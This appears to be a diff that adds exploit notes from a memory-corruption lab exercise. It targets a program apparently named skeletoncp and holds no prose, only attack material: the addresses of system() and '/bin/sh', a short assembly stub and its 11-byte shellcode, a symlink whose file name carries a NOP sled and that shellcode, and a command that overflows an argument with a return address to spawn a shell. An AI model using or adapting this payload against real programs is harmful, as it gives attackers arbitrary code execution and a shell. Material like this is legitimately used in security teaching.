@@ -1,0 +1,35 @@
+<system address>
+	0x40058ae0
+</system address>
+
+<"/bin/sh" address>
+	0x400fbff9
+</"/bin/sh" address>
+
+<shell.S>
+	.section .text
+	.globl _start
+
+	_start:
+		push $0x400fbff9
+		call 0x40058ae0
+</shell.S>
+
+<shellcode>
+	\x68\xf9\xbf\x0f\x40\xff\x15\xe0\x8a\x05\x40
+	length: 11
+</shellcode>
+
+<file name>
+	ln -sf skeletoncp "$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x68\xf9\xbf\x0f\x40\xff\x15\xe0\x8a\x05\x40")"
+</file name>
+
+<file name address>
+	0xbfffffe3
+</file name address>
+
+<command>
+	./"$(for x in `seq 1 100`; do printf "\x90"; done)$(printf "\x68\xf9\xbf\x0f\x40\xff\x15\xe0\x8a\x05\x40")" "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\xb0\xff\xff\xbf")" 
+</command>
+
+ebp: 0xbffff9f8
